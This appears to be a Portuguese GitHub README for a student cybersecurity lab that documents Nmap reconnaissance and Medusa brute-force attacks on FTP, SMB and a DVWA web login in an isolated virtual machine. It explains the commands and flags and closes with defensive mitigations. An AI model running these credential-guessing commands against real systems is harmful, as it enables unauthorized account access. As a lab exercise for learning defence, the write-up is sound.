<img width="1276" height="432" alt="Screenshot_77" src="https://github.com/user-attachments/assets/ca08c0c0-ce32-4130-83c2-6b7993e7fa90" />
# Desafio DIO: Criando um Ataque Brute Force de Senhas com Medusa e Kali Linux

Repositório desenvolvido como entrega de desafio prático durante os meus estudos de Cibersegurança com bolsa da **DIO (Digital Innovation One)**. O objetivo é documentar o processo técnico de auditoria de senhas e testes de força bruta em ambiente controlado utilizando **Kali Linux**, **Nmap** e **Medusa**.

> **Aviso Legal:** Todo o conteúdo deste repositório tem fins exclusivamente educacionais e de aprendizado em segurança da informação. Todos os testes foram realizados em ambiente isolado de laboratório (máquinas virtuais locais e aplicações propositalmente vulneráveis, como o DVWA).

---

## Objetivos de Aprendizagem
- Compreender o funcionamento de ataques de força bruta em diferentes serviços (**FTP**, **Web** e **SMB**).
- Utilizar o **Kali Linux** e o **Medusa** para auditoria de segurança em ambiente controlado.
- Documentar processos técnicos e evidências de forma clara e estruturada no GitHub.
- Reconhecer vulnerabilidades de autenticação e propor medidas de mitigação.

## Ferramentas e Ambiente Utilizados
- **Sistema Operacional:** Kali Linux (Máquina Virtual)
- **Reconhecimento de Serviços:** Nmap
- **Auditoria / Força Bruta:** Medusa
- **Alvos de Laboratório:** Serviços FTP, SMB e aplicação web **DVWA (Damn Vulnerable Web Application)**
- **IP da Máquina Virtual de Teste:** `192.168.56.101`

---

## Passo a Passo Técnico (Ambiente de Laboratório)

### 1. Reconhecimento com Nmap
Antes de testar credenciais, identificamos quais portas e serviços estão ativos no alvo:
```bash
nmap -sV 192.168.56.101

2. Teste de Força Bruta em FTP
Testando combinações de usuários e senhas contra o serviço FTP:

medusa -h 192.168.56.101 -U wordlists/usuarios.txt -P wordlists/senhas.txt -M ftp -t 4 -f

3. Teste de Força Bruta em SMB
Auditando credenciais de compartilhamento de rede SMB:

medusa -h 192.168.56.101 -U wordlists/usuarios.txt -P wordlists/senhas.txt -M smbnt -t 4 -f

4. Teste de Força Bruta em Aplicação Web (DVWA / HTTP)
Testando formulários de autenticação web em ambiente de laboratório:

medusa -h 192.168.56.101 -U wordlists/usuarios.txt -P wordlists/senhas.txt -M http -m DIR:/dvwa/login.php -t 4 -f

Principais Flags do Medusa
-h: endereço IP ou host do alvo.

-u / -U: usuário único ou arquivo (wordlist) de usuários.

-p / -P: senha única ou arquivo (wordlist) de senhas.

-M: módulo/protocolo do serviço testado (ftp, smbnt, http, ssh, etc.).

-t: número de threads (conexões simultâneas).

-f: interrompe a execução ao encontrar a primeira credencial válida.

Medidas de Mitigação e Defesa
Autenticação Multifator (MFA): impede o acesso mesmo que a senha seja descoberta.

Políticas de Senhas Fortes: exigir senhas longas, complexas e evitar credenciais padrão.

Bloqueio de Tentativas e Rate Limiting: configurar ferramentas como fail2ban ou bloqueio temporário de conta após falhas consecutivas.

Proteção contra Captcha e Tokens CSRF: implementar mecanismos anti-automação em formulários de login web.

Segmentação e Restrição de Acesso: limitar exposição de serviços como FTP e SMB apenas às redes estritamente necessárias.


Referências e Documentações
DIO (Digital Innovation One) — Desafio: Criando um Ataque Brute Force de senhas com Medusa e Kali Linux

Kali Linux – Site Oficial

DVWA – Damn Vulnerable Web Application

Medusa – Documentação Oficial

Nmap – Manual Oficial
